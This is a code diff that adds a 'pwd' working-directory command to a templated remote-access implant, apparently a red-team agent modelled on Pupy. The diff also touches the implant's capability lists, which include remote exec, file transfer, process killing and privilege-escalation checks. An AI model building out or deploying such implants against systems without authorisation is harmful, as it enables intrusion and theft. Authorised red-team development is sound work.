@@ -636,6 +636,7 @@ def _action_bind() -> None:
     table["processes"] = lambda task: mod_processes()
     table["netstat"] = lambda task: mod_netstat()
     table["process_kill"] = lambda task: mod_process_kill(task)
+    table["pwd"] = lambda task: mod_pwd()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -710,7 +711,7 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1493,6 +1494,20 @@ def mod_process_kill(task: dict) -> dict:
         return {"error": f"kill failed: {exc}"}
 
 
+def mod_pwd():
+    """The agent's working directory.
+
+    Upstream Pupy's ``pwd``. Not derivable from anything the implant already
+    answers: ``fs_list`` with no path defaults to "." but never reports what
+    that resolved to, so an operator reading relative paths back has no way to
+    anchor them.
+    """
+    try:
+        return {"cwd": _o.getcwd(), "platform": PLATFORM}
+    except Exception as exc:
+        return {"error": f"cannot determine the working directory: {exc}"}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2191,7 +2206,7 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2316,7 +2331,7 @@ def _parse_command(text: str) -> dict:
         return {"action": "exec", "command": text}
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
-    if v in ("sysinfo", "network", "netstat", "privesc_check", "privesc_suggest", "ping"):
+    if v in ("sysinfo", "network", "netstat", "pwd", "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
         # Both words answer the server's capability by that name. A word the
